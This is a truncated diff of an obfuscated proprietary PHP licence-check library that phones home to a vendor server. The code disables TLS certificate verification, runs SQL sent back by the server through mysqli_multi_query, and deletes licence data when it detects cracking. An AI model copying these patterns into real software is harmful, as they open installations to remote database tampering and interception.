@@ -1,17 +1,810 @@
 <?php
-/*   __________________________________________________
-    |  Obfuscated by YAK Pro - Php Obfuscator  2.0.14  |
-    |              on 2025-05-28 15:19:40              |
-    |    GitHub: https://github.com/pk-fr/yakpro-po    |
-    |__________________________________________________|
-*/
 /*
 * Copyright (C) Incevio Systems, Inc - All Rights Reserved
 * Unauthorized copying of this file, via any medium is strictly prohibited
 * Proprietary and confidential
 * Written by Munna Khan <help.zcart@gmail.com>, September 2018
 */
-if (!function_exists('aplCustomEncrypt')) { function aplCustomEncrypt($string, $key) { $encrypted_string = null; if (!(!empty($string) && !empty($key))) { goto YpMC5; } $iv = openssl_random_pseudo_bytes(openssl_cipher_iv_length("\x61\145\x73\x2d\62\65\x36\x2d\x63\142\143")); $encrypted_string = openssl_encrypt($string, "\141\145\163\x2d\x32\65\66\55\143\142\x63", $key, 0, $iv); $encrypted_string = base64_encode($encrypted_string . "\x3a\x3a" . $iv); YpMC5: return $encrypted_string; } function aplCustomDecrypt($string, $key) { $decrypted_string = null; if (!(!empty($string) && !empty($key))) { goto goMOW; } $string = base64_decode($string); if (!stristr($string, "\72\x3a")) { goto P2qZK; } $string_iv_array = explode("\72\x3a", $string, 2); if (!(!empty($string_iv_array) && count($string_iv_array) == 2)) { goto p1SsT; } list($encrypted_string, $iv) = $string_iv_array; $decrypted_string = openssl_decrypt($encrypted_string, "\x61\145\x73\55\62\x35\x36\x2d\x63\142\x63", $key, 0, $iv); p1SsT: P2qZK: goMOW: return $decrypted_string; } function aplValidateIntegerValue($number, $min_value = 0, $max_value = INF) { $result = false; if (!(!is_float($number) && filter_var($number, FILTER_VALIDATE_INT, array("\157\160\x74\x69\157\x6e\163" => array("\x6d\151\x6e\x5f\162\x61\156\x67\x65" => $min_value, "\155\x61\170\x5f\162\141\x6e\x67\x65" => $max_value))) !== false)) { goto Lz7j7; } $result = true; Lz7j7: return $result; } function aplValidateRawDomain($url) { $result = false; if (empty($url)) { goto t3IPA; } if (preg_match("\57\136\x5b\x61\x2d\x7a\x30\x2d\71\55\56\x5d\53\134\x2e\133\141\55\x7a\134\56\x5d\x7b\62\x2c\x37\x7d\x24\57", strtolower($url))) { goto bHb9X; } $result = false; goto v67Mw; bHb9X: $result = true; v67Mw: t3IPA: return $result; } function aplGetCurrentUrl($remove_last_slash = null) { $protocol = "\x68\x74\x74\160"; $host = null; $script = null; $params = null; $current_url = null; if (!(isset($_SERVER["\x48\124\x54\120\x53"]) && $_SERVER["\110\124\124\120\123"] !== "\157\146\x66" || isset($_SERVER["\x48\124\x54\120\x5f\x58\x5f\106\117\122\x57\x41\122\x44\x45\104\x5f\120\122\x4f\x54\117"]) && $_SERVER["\110\x54\124\120\137\x58\x5f\x46\x4f\122\127\101\122\x44\105\x44\x5f\x50\x52\x4f\x54\117"] == "\x68\164\x74\x70\163")) { goto Y6UP9; } $protocol = "\x68\164\164\x70\x73"; Y6UP9: if (!isset($_SERVER["\x48\x54\124\120\x5f\110\117\123\x54"])) { goto lLlcY; } $host = $_SERVER["\x48\x54\x54\120\137\x48\x4f\123\x54"]; lLlcY: if (!isset($_SERVER["\123\x43\x52\111\120\x54\137\x4e\x41\115\105"])) { goto OjKeT; } $script = $_SERVER["\123\x43\122\x49\x50\x54\x5f\x4e\x41\115\105"]; OjKeT: if (!isset($_SERVER["\x51\x55\x45\x52\x59\x5f\123\124\122\111\x4e\107"])) { goto S9ILA; } $params = $_SERVER["\121\x55\x45\122\131\137\123\x54\x52\x49\x4e\107"]; S9ILA: if (!(!empty($protocol) && !empty($host) && !empty($script))) { goto uHOnz; } $current_url = $protocol . "\x3a\x2f\x2f" . $host . $script; if (empty($params)) { goto x9XiS; } $current_url .= "\77" . $params; x9XiS: if (!($remove_last_slash == 1)) { goto ZgR9V; } GVki6: if (!(substr($current_url, -1) == "\57")) { goto KHO4j; } $current_url = substr($current_url, 0, -1); goto GVki6; KHO4j: ZgR9V: uHOnz: return $current_url; } function aplGetRawDomain($url) { $raw_domain = null; if (empty($url)) { goto LUk4w; } $url_array = parse_url($url); if (!empty($url_array["\x73\x63\150\x65\x6d\145"])) { goto fj4TD; } $url = "\150\x74\164\x70\72\x2f\57" . $url; $url_array = parse_url($url); fj4TD: if (empty($url_array["\x68\157\163\x74"])) { goto BfP9E; } $raw_domain = $url_array["\150\x6f\163\x74"]; $raw_domain = trim(str_ireplace("\x77\167\167\56", '', filter_var($raw_domain, FILTER_SANITIZE_URL))); BfP9E: LUk4w: return $raw_domain; } function aplGetRootUrl($url, $remove_scheme, $remove_www, $remove_path, $remove_last_slash) { if (!filter_var($url, FILTER_VALIDATE_URL)) { goto vggXo; } $url_array = parse_url($url); $url = str_ireplace($url_array["\x73\143\150\x65\155\x65"] . "\x3a\x2f\57", '', $url); if ($remove_path == 1) { goto ZsjlE; } $last_slash_position = strripos($url, "\x2f"); if (!($last_slash_position > 0)) { goto kQW89; } $url = substr($url, 0, $last_slash_position + 1); kQW89: goto TOrmp; ZsjlE: $first_slash_position = stripos($url, "\57"); if (!($first_slash_position > 0)) { goto movHk; } $url = substr($url, 0, $first_slash_position + 1); movHk: TOrmp: if (!($remove_scheme != 1)) { goto mcDaE; } $url = $url_array["\163\143\150\145\155\x65"] . "\72\57\57" . $url; mcDaE: if (!($remove_www == 1)) { goto LQoN9; } $url = str_ireplace("\167\x77\x77\x2e", '', $url); LQoN9: if (!($remove_last_slash == 1)) { goto fXoKW; } orXF8: if (!(substr($url, -1) == "\57")) { goto o_IPL; } $url = substr($url, 0, -1); goto orXF8; o_IPL: fXoKW: vggXo: return trim($url); } function aplCustomPost($url, $post_info = null, $refer = null) { $user_agent = "\160\150\160\x6d\x69\x6c\154\151\157\x6e\x20\x63\x55\122\114"; $connect_timeout = 10; $server_response_array = array(); $formatted_headers_array = array(); if (!(filter_var($url, FILTER_VALIDATE_URL) && !empty($post_info))) { goto d0AuC; } if (!(empty($refer) || !filter_var($refer, FILTER_VALIDATE_URL))) { goto sZo6H; } $refer = $url; sZo6H: $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_USERAGENT, $user_agent); curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $connect_timeout); curl_setopt($ch, CURLOPT_TIMEOUT, $connect_timeout); curl_setopt($ch, CURLOPT_REFERER, $refer); curl_setopt($ch, CURLOPT_POST, 1); curl_setopt($ch, CURLOPT_POSTFIELDS, $post_info); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); curl_setopt($ch, CURLOPT_MAXREDIRS, 10); curl_setopt($ch, CURLOPT_HEADERFUNCTION, function ($curl, $header) use(&$formatted_headers_array) { $len = strlen($header); $header = explode("\72", $header, 2); if (!(count($header) < 2)) { goto NuTNj; } return $len; NuTNj: $name = strtolower(trim($header[0])); $formatted_headers_array[$name] = trim($header[1]); return $len; }); $result = curl_exec($ch); $curl_error = curl_error($ch); curl_close($ch); $server_response_array["\150\145\141\144\x65\162\163"] = $formatted_headers_array; $server_response_array["\145\x72\x72\x6f\x72"] = $curl_error; $server_response_array["\x62\x6f\144\x79"] = $result; d0AuC: return $server_response_array; } function aplVerifyDateTime($datetime, $format) { $result = false; if (!(!empty($datetime) && !empty($format))) { goto XaT3g; } $datetime = DateTime::createFromFormat($format, $datetime); $errors = DateTime::getLastErrors(); if (!($datetime && empty($errors["\167\141\162\x6e\151\156\147\x5f\143\x6f\x75\156\164"]))) { goto uWRBN; } $result = true; uWRBN: XaT3g: return $result; } function aplGetDaysBetweenDates($date_from, $date_to) { $number_of_days = 0; if (!(aplVerifyDateTime($date_from, "\131\x2d\155\x2d\144") && aplVerifyDateTime($date_to, "\131\55\155\x2d\x64"))) { goto G6Abq; } $date_to = new DateTime($date_to); $date_from = new DateTime($date_from); $number_of_days = $date_from->diff($date_to)->format("\45\x61"); G6Abq: return $number_of_days; } function aplParseXmlTags($content, $tag_name) { $parsed_value = null; if (!(!empty($content) && !empty($tag_name))) { goto SWb4W; } preg_match_all("\57\x3c" . preg_quote($tag_name, "\57") . "\x3e\x28\x2e\x2a\x3f\51\x3c\134\x2f" . preg_quote($tag_name, "\57") . "\x3e\57\151\x6d\x73", $content, $output_array, PREG_SET_ORDER); if (empty($output_array[0][1])) { goto Er4Qy; } $parsed_value = trim($output_array[0][1]); Er4Qy: SWb4W: return $parsed_value; } function aplParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE, $product = Null) { $notifications_array = array(); if (!empty($content_array)) { goto UNkR9; } $notifications_array["\156\x6f\x74\151\146\151\x63\x61\164\151\x6f\156\x5f\143\141\163\145"] = "\156\x6f\164\x69\x66\x69\143\141\164\151\157\x6e\x5f\156\157\137\x63\157\156\x6e\145\x63\164\x69\x6f\156"; $notifications_array["\156\157\164\x69\146\151\x63\141\164\151\157\x6e\137\164\x65\170\164"] = APL_NOTIFICATION_NO_CONNECTION; goto jeZqQ; UNkR9: if (!empty($content_array["\x68\145\141\x64\145\162\163"]["\156\x6f\x74\x69\x66\151\x63\141\164\x69\157\x6e\137\x73\145\x72\x76\145\x72\137\x73\151\147\x6e\x61\164\165\162\x65"]) && aplVerifyServerSignature($content_array["\150\x65\141\144\145\162\163"]["\156\x6f\164\x69\146\x69\143\141\164\x69\x6f\x6e\137\x73\x65\162\166\x65\x72\x5f\x73\x69\x67\x6e\141\164\x75\162\x65"], $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE, $product)) { goto eelS9; } $notifications_array["\156\157\164\x69\146\x69\143\141\x74\151\x6f\x6e\137\x63\141\163\145"] = "\x6e\x6f\164\151\146\151\x63\x61\x74\151\157\156\x5f\x69\156\166\141\x6c\151\144\x5f\x72\x65\x73\160\x6f\x6e\163\x65"; $notifications_array["\x6e\157\x74\x69\x66\x69\x63\141\x74\x69\x6f\x6e\137\x74\x65\170\x74"] = APL_NOTIFICATION_INVALID_RESPONSE; goto tDR6J; eelS9: $notifications_array["\x6e\157\164\151\146\151\x63\x61\x74\151\x6f\x6e\137\143\x61\163\145"] = $content_array["\150\145\x61\x64\145\162\163"]["\x6e\x6f\164\x69\146\151\143\x61\x74\x69\x6f\156\137\x63\141\x73\x65"]; $notifications_array["\156\157\164\151\146\x69\143\141\164\x69\157\x6e\137\164\x65\x78\x74"] = $content_array["\x68\145\x61\144\x65\x72\163"]["\x6e\x6f\164\151\x66\x69\143\141\x74\151\x6f\156\x5f\164\x65\x78\x74"]; if (empty($content_array["\150\x65\141\x64\x65\162\163"]["\x6e\157\x74\151\146\x69\x63\x61\x74\x69\157\x6e\x5f\x64\141\164\141"])) { goto vEj0m; } $notifications_array["\156\157\164\x69\146\x69\x63\141\x74\151\x6f\x6e\x5f\x64\141\164\141"] = json_decode($content_array["\150\145\141\144\x65\162\163"]["\156\x6f\164\151\146\151\x63\141\x74\x69\157\x6e\x5f\144\141\x74\141"], true); vEj0m: tDR6J: jeZqQ: return $notifications_array; } function aplGenerateScriptSignature($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE, $product = Null) { $script_signature = null; $root_ips_array = gethostbynamel(aplGetRawDomain(APL_ROOT_URL)); $product = $product == Null ? APL_PRODUCT_ID : $product; if (!(!empty($ROOT_URL) && isset($CLIENT_EMAIL) && isset($LICENSE_CODE) && !empty($root_ips_array))) { goto T_PWf; } $script_signature = hash("\x73\x68\x61\62\x35\x36", gmdate("\131\x2d\x6d\55\144") . $ROOT_URL . $CLIENT_EMAIL . $LICENSE_CODE . $product . implode('', $root_ips_array)); T_PWf: return $script_signature; } function aplVerifyServerSignature($notification_server_signature, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE, $product = Null) { $result = false; $root_ips_array = gethostbynamel(aplGetRawDomain(APL_ROOT_URL)); $product = $product == Null ? APL_PRODUCT_ID : $product; if (!(!empty($notification_server_signature) && !empty($ROOT_URL) && isset($CLIENT_EMAIL) && isset($LICENSE_CODE) && !empty($root_ips_array))) { goto VdWiA; } if (!(hash("\163\x68\141\x32\65\66", implode('', $root_ips_array) . $product . $LICENSE_CODE . $CLIENT_EMAIL . $ROOT_URL . gmdate("\131\x2d\x6d\x2d\x64")) == $notification_server_signature)) { goto Ex3yU; } $result = true; Ex3yU: VdWiA: return $result; } function aplCheckSettings() { $notifications_array = array(); if (!(empty(APL_SALT) || APL_SALT == "\163\157\155\145\x5f\x72\x61\x6e\x64\x6f\x6d\137\164\145\170\x74")) { goto e6Mx7; } $notifications_array[] = APL_CORE_NOTIFICATION_INVALID_SALT; e6Mx7: if (!(!filter_var(APL_ROOT_URL, FILTER_VALIDATE_URL) || !ctype_alnum(substr(APL_ROOT_URL, -1)))) { goto bMaTC; } $notifications_array[] = APL_CORE_NOTIFICATION_INVALID_ROOT_URL; bMaTC: if (filter_var(APL_PRODUCT_ID, FILTER_VALIDATE_INT)) { goto vmKhu; } $notifications_array[] = APL_CORE_NOTIFICATION_INVALID_PRODUCT_ID; vmKhu: if (aplValidateIntegerValue(APL_DAYS, 1, 365)) { goto CcqAE; } $notifications_array[] = APL_CORE_NOTIFICATION_INVALID_VERIFICATION_PERIOD; CcqAE: if (!(APL_STORAGE != "\104\x41\124\101\x42\x41\x53\105" && APL_STORAGE != "\x46\111\x4c\x45")) { goto T_mg9; } $notifications_array[] = APL_CORE_NOTIFICATION_INVALID_STORAGE; T_mg9: if (!(APL_STORAGE == "\x44\101\x54\x41\102\101\x53\x45" && !ctype_alnum(str_ireplace(array("\x5f"), '', APL_DATABASE_TABLE)))) { goto kjtIh; } $notifications_array[] = APL_CORE_NOTIFICATION_INVALID_TABLE; kjtIh: if (!(APL_STORAGE == "\x46\111\114\x45" && !@is_writable(APL_DIRECTORY . "\57" . APL_LICENSE_FILE_LOCATION))) { goto Zu4C7; } $notifications_array[] = APL_CORE_NOTIFICATION_INVALID_LICENSE_FILE; Zu4C7: if (!(!empty(APL_ROOT_IP) && !filter_var(APL_ROOT_IP, FILTER_VALIDATE_IP))) { goto RAFhL; } $notifications_array[] = APL_CORE_NOTIFICATION_INVALID_ROOT_IP; RAFhL: if (!(!empty(APL_ROOT_IP) && !in_array(APL_ROOT_IP, gethostbynamel(aplGetRawDomain(APL_ROOT_URL))))) { goto Jm07Y; } $notifications_array[] = APL_CORE_NOTIFICATION_INVALID_DNS; Jm07Y: if (!(defined("\101\120\x4c\137\x52\117\117\x54\137\x4e\x41\115\105\x53\105\122\126\105\122\123") && !empty(APL_ROOT_NAMESERVERS))) { goto bW0fY; } foreach (APL_ROOT_NAMESERVERS as $nameserver) { if (aplValidateRawDomain($nameserver)) { goto L443k; } $notifications_array[] = APL_CORE_NOTIFICATION_INVALID_ROOT_NAMESERVERS; goto Sj8Um; L443k: kPeC1: } Sj8Um: bW0fY: if (!(defined("\x41\120\x4c\x5f\x52\x4f\117\x54\137\116\x41\x4d\105\x53\x45\122\x56\105\122\x53") && !empty(APL_ROOT_NAMESERVERS))) { goto GjpkC; } $apl_root_nameservers_array = APL_ROOT_NAMESERVERS; $fetched_nameservers_array = array(); $dns_records_array = dns_get_record(aplGetRawDomain(APL_ROOT_URL), DNS_NS); foreach ($dns_records_array as $record) { $fetched_nameservers_array[] = $record["\164\x61\162\147\145\x74"]; EtESe: } iWgz3: $apl_root_nameservers_array = array_map("\x73\164\x72\x74\157\154\157\x77\145\162", $apl_root_nameservers_array); $fetched_nameservers_array = array_map("\163\164\162\164\157\x6c\157\167\145\x72", $fetched_nameservers_array); sort($apl_root_nameservers_array); sort($fetched_nameservers_array); if (!($apl_root_nameservers_array != $fetched_nameservers_array)) { goto L8uGD; } $notifications_array[] = APL_CORE_NOTIFICATION_INVALID_DNS; L8uGD: GjpkC: return $notifications_array; } function aplParseLicenseFile() { $license_data_array = array(); if (!@is_readable(APL_DIRECTORY . "\x2f" . APL_LICENSE_FILE_LOCATION)) { goto oZ0HK; } $file_content = file_get_contents(APL_DIRECTORY . "\x2f" . APL_LICENSE_FILE_LOCATION); preg_match_all("\x2f\74\x28\x5b\x41\x2d\132\137\x5d\53\51\76\x28\56\52\x3f\x29\74\x5c\57\x28\133\x41\x2d\132\x5f\x5d\x2b\x29\x3e\x2f", $file_content, $matches, PREG_SET_ORDER); if (empty($matches)) { goto nytRD; } foreach ($matches as $value) { if (!(!empty($value[1]) && $value[1] == $value[3])) { goto XzZ1x; } $license_data_array[$value[1]] = $value[2]; XzZ1x: HFXuB: } R6QJ7: nytRD: oZ0HK: return $license_data_array; } function aplGetLicenseData($MYSQLI_LINK = null) { $settings_row = array(); if (!(APL_STORAGE == "\104\101\124\x41\x42\101\x53\105")) { goto TXDGZ; } $table_exist = @mysqli_query($MYSQLI_LINK, "\x53\110\117\x57\x20\x54\101\x42\x4c\x45\123\40\x4c\x49\x4b\105\x20\47" . APL_DATABASE_TABLE . "\47"); if (!@mysqli_fetch_assoc($table_exist)) { goto Y45bm; } $settings_results = @mysqli_query($MYSQLI_LINK, "\x53\105\114\105\103\124\40\52\x20\106\122\117\115\x20" . APL_DATABASE_TABLE); $settings_row = @mysqli_fetch_assoc($settings_results); Y45bm: TXDGZ: if (!(APL_STORAGE == "\x46\111\x4c\105")) { goto BJhdm; } $settings_row = aplParseLicenseFile(); BJhdm: return $settings_row; } function aplCheckConnection() { $notifications_array = array(); $content_array = aplCustomPost(APL_ROOT_URL . "\x2f\141\160\154\137\143\x61\x6c\x6c\142\141\x63\153\163\x2f\143\157\156\156\145\x63\164\x69\x6f\156\x5f\164\x65\163\164\56\x70\150\x70", "\x70\x72\x6f\144\165\x63\164\x5f\x69\x64\x3d" . rawurlencode(APL_PRODUCT_ID) . "\46\143\x6f\x6e\156\x65\x63\164\151\x6f\x6e\137\x68\141\163\150\x3d" . rawurlencode(hash("\x73\x68\x61\62\x35\x36", "\143\x6f\x6e\x6e\145\143\164\x69\x6f\156\137\x74\145\163\x74"))); if (!empty($content_array)) { goto MxNNU; } $notifications_array["\x6e\157\x74\x69\x66\x69\143\141\x74\x69\157\156\x5f\143\141\x73\145"] = "\156\157\x74\151\146\151\143\x61\164\x69\x6f\156\137\156\157\x5f\x63\157\x6e\156\x65\x63\x74\x69\157\156"; $notifications_array["\156\x6f\164\x69\x66\151\x63\x61\164\151\157\156\137\x74\x65\x78\x74"] = APL_NOTIFICATION_NO_CONNECTION; goto yZMY7; MxNNU: if (!($content_array["\x62\157\144\171"] != "\x3c\143\157\x6e\x6e\145\143\x74\151\157\156\x5f\164\145\x73\x74\x3e\117\113\x3c\57\x63\157\x6e\156\x65\143\164\151\157\156\137\x74\x65\163\164\76")) { goto lMYh4; } $notifications_array["\x6e\157\x74\x69\146\151\143\x61\x74\151\x6f\x6e\x5f\x63\141\x73\x65"] = "\x6e\157\164\x69\146\151\143\x61\164\x69\x6f\156\x5f\151\156\166\141\154\151\144\x5f\162\x65\x73\160\x6f\156\x73\x65"; $notifications_array["\156\x6f\164\151\146\151\x63\x61\x74\x69\157\156\137\x74\145\170\164"] = APL_NOTIFICATION_INVALID_RESPONSE; lMYh4: yZMY7: return $notifications_array; } function aplCheckData($MYSQLI_LINK = null) { $error_detected = 0; $cracking_detected = 0; $data_check_result = false; extract(aplGetLicenseData($MYSQLI_LINK)); if (!(!empty($ROOT_URL) && !empty($INSTALLATION_HASH) && !empty($INSTALLATION_KEY) && !empty($LCD) && !empty($LRD))) { goto Rxg4k; } $LCD = aplCustomDecrypt($LCD, APL_SALT . $INSTALLATION_KEY); $LRD = aplCustomDecrypt($LRD, APL_SALT . $INSTALLATION_KEY); if (!(!filter_var($ROOT_URL, FILTER_VALIDATE_URL) || !ctype_alnum(substr($ROOT_URL, -1)))) { goto EuL5e; } $error_detected = 1; EuL5e: if (!(filter_var(aplGetCurrentUrl(), FILTER_VALIDATE_URL) && stristr(aplGetRootUrl(aplGetCurrentUrl(), 1, 1, 0, 1), aplGetRootUrl("{$ROOT_URL}\x2f", 1, 1, 0, 1)) === false)) { goto t5vgF; } $error_detected = 1; t5vgF: if (!(empty($INSTALLATION_HASH) || $INSTALLATION_HASH != hash("\163\150\141\x32\65\66", $ROOT_URL . $CLIENT_EMAIL . $LICENSE_CODE))) { goto ZA5fe; } $error_detected = 1; ZA5fe: if (!(empty($INSTALLATION_KEY) || !password_verify($LRD, aplCustomDecrypt($INSTALLATION_KEY, APL_SALT . $ROOT_URL)))) { goto pE17E; } $error_detected = 1; pE17E: if (aplVerifyDateTime($LCD, "\x59\x2d\155\55\144")) { goto bJ9sM; } $error_detected = 1; bJ9sM: if (aplVerifyDateTime($LRD, "\131\x2d\x6d\55\x64")) { goto xVzrb; } $error_detected = 1; xVzrb: if (!(aplVerifyDateTime($LCD, "\131\55\x6d\x2d\144") && $LCD > date("\131\55\x6d\55\x64", strtotime("\x2b\61\40\144\141\x79")))) { goto R2tDk; } $error_detected = 1; $cracking_detected = 1; R2tDk: if (!(aplVerifyDateTime($LRD, "\131\x2d\155\55\x64") && $LRD > date("\x59\x2d\155\x2d\144", strtotime("\x2b\61\x20\x64\x61\171")))) { goto rMdM2; } $error_detected = 1; $cracking_detected = 1; rMdM2: if (!(aplVerifyDateTime($LCD, "\x59\55\155\55\144") && aplVerifyDateTime($LRD, "\x59\55\155\55\144") && $LCD > $LRD)) { goto EA2aB; } $error_detected = 1; $cracking_detected = 1; EA2aB: if (!($cracking_detected == 1 && APL_DELETE_CRACKED == "\x59\x45\x53")) { goto lHIW5; } aplDeleteData($MYSQLI_LINK); lHIW5: if (!($error_detected != 1 && $cracking_detected != 1)) { goto kE4Lk; } $data_check_result = true; kE4Lk: Rxg4k: return $data_check_result; } function aplVerifyEnvatoPurchase($LICENSE_CODE = null) { $notifications_array = array(); $content_array = aplCustomPost(APL_ROOT_URL . "\x2f\141\x70\154\x5f\143\141\x6c\x6c\x62\x61\143\x6b\x73\x2f\166\145\162\151\146\171\x5f\x65\x6e\166\141\164\x6f\x5f\160\165\162\143\x68\x61\x73\x65\56\x70\x68\x70", "\160\x72\157\x64\165\x63\164\137\x69\x64\x3d" . rawurlencode(APL_PRODUCT_ID) . "\46\x6c\x69\x63\x65\156\x73\x65\137\x63\x6f\x64\145\75" . rawurlencode($LICENSE_CODE) . "\x26\143\x6f\156\x6e\x65\x63\x74\x69\x6f\156\x5f\x68\141\163\x68\75" . rawurlencode(hash("\163\x68\x61\x32\65\66", "\166\x65\162\x69\146\171\x5f\145\156\x76\141\164\157\x5f\x70\x75\x72\143\150\x61\163\145"))); if (!empty($content_array)) { goto GXk8F; } $notifications_array["\156\x6f\164\151\146\151\x63\141\164\151\x6f\x6e\137\143\141\163\x65"] = "\156\x6f\164\x69\x66\151\143\x61\x74\151\x6f\x6e\137\x6e\x6f\137\x63\x6f\156\156\x65\x63\164\151\157\x6e"; $notifications_array["\x6e\x6f\x74\151\x66\151\143\x61\x74\x69\157\156\x5f\x74\x65\170\164"] = APL_NOTIFICATION_NO_CONNECTION; goto gqBEn; GXk8F: if (!($content_array["\x62\157\144\171"] != "\x3c\x76\x65\162\x69\x66\171\137\145\156\x76\141\164\x6f\x5f\x70\x75\x72\143\x68\141\163\x65\76\x4f\113\74\x2f\166\x65\x72\151\x66\171\137\x65\x6e\166\141\x74\157\137\x70\165\162\x63\150\141\163\145\x3e")) { goto BWftN; } $notifications_array["\x6e\x6f\164\x69\x66\x69\x63\x61\164\151\157\156\137\x63\x61\x73\x65"] = "\156\157\x74\x69\x66\x69\143\141\x74\151\x6f\156\137\x69\156\x76\x61\x6c\x69\144\x5f\x72\145\163\x70\x6f\x6e\163\x65"; $notifications_array["\156\157\164\151\146\x69\143\x61\164\151\157\156\x5f\164\145\x78\x74"] = APL_NOTIFICATION_INVALID_RESPONSE; BWftN: gqBEn: return $notifications_array; } function incevioVerify($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE, $MYSQLI_LINK = null) { $notifications_array = array(); $apl_core_notifications = aplCheckSettings(); if (empty($apl_core_notifications)) { goto OIgna; } $notifications_array["\156\x6f\x74\151\146\x69\143\x61\x74\x69\x6f\156\x5f\143\141\x73\x65"] = "\x6e\157\164\151\x66\x69\x63\141\x74\x69\x6f\156\x5f\x73\143\162\x69\x70\164\137\x63\157\162\162\165\160\164\x65\x64"; $notifications_array["\156\157\164\151\x66\x69\x63\141\164\151\x6f\x6e\x5f\x74\x65\170\x74"] = implode("\73\x20", $apl_core_notifications); goto wUMLv; OIgna: if (!empty(aplGetLicenseData($MYSQLI_LINK)) && is_array(aplGetLicenseData($MYSQLI_LINK))) { goto tzLMb; } $INSTALLATION_HASH = hash("\163\150\141\x32\x35\x36", $ROOT_URL . $CLIENT_EMAIL . $LICENSE_CODE); $post_info = "\x70\x72\x6f\144\x75\x63\164\x5f\x69\x64\x3d" . rawurlencode(APL_PRODUCT_ID) . "\x26\143\x6c\151\145\x6e\x74\x5f\145\x6d\141\151\154\75" . rawurlencode($CLIENT_EMAIL) . "\46\154\x69\x63\145\156\x73\145\x5f\143\157\144\145\75" . rawurlencode($LICENSE_CODE) . "\x26\x72\157\x6f\164\x5f\165\162\x6c\75" . rawurlencode($ROOT_URL) . "\x26\x69\x6e\163\x74\x61\x6c\x6c\x61\164\151\157\x6e\137\x68\x61\x73\x68\x3d" . rawurlencode($INSTALLATION_HASH) . "\46\154\x69\x63\145\x6e\x73\x65\137\163\151\147\x6e\141\164\x75\162\145\75" . rawurlencode(aplGenerateScriptSignature($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE)); $content_array = aplCustomPost(APL_ROOT_URL . "\57\141\160\x6c\x5f\143\141\154\x6c\142\x61\x63\x6b\x73\x2f\154\x69\143\x65\x6e\163\145\x5f\151\156\x73\164\141\x6c\x6c\x2e\x70\150\x70", $post_info, $ROOT_URL); $notifications_array = aplParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE); if (!($notifications_array["\156\157\x74\151\146\151\143\x61\164\x69\157\156\x5f\x63\x61\163\x65"] == "\x6e\x6f\x74\x69\146\151\143\x61\164\x69\157\x6e\137\x6c\151\143\x65\x6e\163\145\137\x6f\x6b")) { goto APToO; } $INSTALLATION_KEY = aplCustomEncrypt(password_hash(date("\x59\55\155\x2d\x64"), PASSWORD_DEFAULT), APL_SALT . $ROOT_URL); $LCD = aplCustomEncrypt(date("\131\55\x6d\x2d\x64", strtotime("\x2d" . APL_DAYS . "\40\x64\141\171\163")), APL_SALT . $INSTALLATION_KEY); $LRD = aplCustomEncrypt(date("\131\x2d\x6d\55\x64"), APL_SALT . $INSTALLATION_KEY); if (!(APL_STORAGE == "\104\101\x54\x41\102\101\x53\105")) { goto FR3BH; } $content_array = aplCustomPost(APL_ROOT_URL . "\57\x61\x70\154\137\143\x61\154\x6c\142\141\x63\x6b\163\x2f\154\151\143\145\x6e\163\145\x5f\x73\x63\x68\x65\155\x65\56\160\150\x70", $post_info, $ROOT_URL); $notifications_array = aplParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE); if (!(!empty($notifications_array["\x6e\x6f\164\151\x66\x69\x63\x61\x74\x69\157\x6e\137\x64\141\x74\141"]) && !empty($notifications_array["\156\x6f\164\x69\146\x69\143\141\x74\x69\157\156\137\x64\141\164\x61"]["\163\x63\150\x65\155\145\137\161\165\x65\162\x79"]))) { goto q_xaL; } $mysql_bad_array = array("\45\101\x50\x4c\137\x44\101\124\x41\x42\101\x53\x45\137\124\x41\102\114\x45\x25", "\45\122\x4f\x4f\x54\x5f\x55\x52\114\x25", "\x25\103\x4c\111\x45\116\124\x5f\x45\115\101\x49\x4c\x25", "\x25\x4c\x49\x43\105\116\123\x45\x5f\x43\x4f\x44\x45\x25", "\x25\114\x43\x44\45", "\45\114\x52\x44\45", "\45\x49\116\123\x54\101\x4c\x4c\x41\x54\x49\x4f\x4e\137\x4b\105\131\x25", "\x25\111\x4e\123\124\101\x4c\x4c\101\x54\111\x4f\x4e\137\x48\x41\123\x48\x25"); $mysql_good_array = array(APL_DATABASE_TABLE, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE, $LCD, $LRD, $INSTALLATION_KEY, $INSTALLATION_HASH); $license_scheme = str_replace($mysql_bad_array, $mysql_good_array, $notifications_array["\156\x6f\x74\151\x66\x69\143\141\164\x69\157\x6e\x5f\144\141\x74\141"]["\x73\143\150\145\x6d\145\137\x71\x75\x65\162\x79"]); mysqli_multi_query($MYSQLI_LINK, $license_scheme) or die(mysqli_error($MYSQLI_LINK)); q_xaL: FR3BH: if (!(APL_STORAGE == "\106\x49\114\105")) { goto hYcuV; } $handle = @fopen(APL_DIRECTORY . "\57" . APL_LICENSE_FILE_LOCATION, "\x77\x2b"); $fwrite = @fwrite($handle, 